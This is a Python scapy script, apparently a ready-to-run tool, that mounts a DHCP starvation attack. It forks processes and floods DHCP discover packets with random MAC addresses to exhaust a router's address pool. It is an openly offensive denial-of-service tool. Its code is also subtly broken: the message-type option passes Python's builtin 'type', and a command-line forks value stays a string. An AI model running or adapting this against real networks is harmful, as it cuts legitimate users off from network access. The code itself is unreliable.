#!/usr/bin/python3

import argparse
import os
import time

import scapy.config
import scapy.layers.dhcp
import scapy.layers.inet
import scapy.layers.l2
import scapy.sendrecv
import scapy.volatile


class Starve:
    """Starve"""

    # Real router
    __gateway_ip: str
    __gateway_mac: str

    def __init__(self):
        self.__gateway_ip = scapy.config.conf.route.route("0.0.0.0")[2]

    def starvation_attack(self, delay, iteration_count, fork_count):
        """DoS router -- DHCP starvation attack"""
        for _ in range(fork_count):
            os.fork()

        for _ in range(iteration_count):
            request = self.generate_packet_client("discover", scapy.volatile.RandMAC())
            scapy.sendrecv.sendp(request)
            time.sleep(int(delay))

    def generate_packet_client(self, packet_type, mac):
        """Return a DHCP a client packet"""
        return (
            scapy.layers.l2.Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
            / scapy.layers.inet.IP(src="0.0.0.0", dst="255.255.255.255")
            / scapy.layers.inet.UDP(sport=68, dport=67)
            / scapy.layers.dhcp.BOOTP(chaddr=mac)
            / scapy.layers.dhcp.DHCP(
                options=[
                    ("message-type", type),
                    ("server_id", self.__gateway_ip),
                    "end",
                ]
            )
        )


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="This script is a DHCP starvation attack."
    )
    parser.add_argument(
        "-s", "--second_delay", required=False, help="Seconds to delay the function"
    )
    parser.add_argument(
        "-i",
        "--iteration",
        required=False,
        help="Number of fakes device to connect (without counting threads)",
    )
    parser.add_argument(
        "-f",
        "--forks",
        required=False,
        help="Number of forks. Remember that forks=2^N (default 4=2^4=16)",
    )
    args = parser.parse_args()

    print("Starve...")

    seconds = 0
    if args.second_delay is not None:
        seconds = args.second_delay

    iteration = 100
    if args.iteration is not None:
        iteration = args.iteration

    forks = 4
    if args.forks is not None:
        forks = args.forks

    s = Starve()
    s.starvation_attack(seconds, int(iteration), forks)
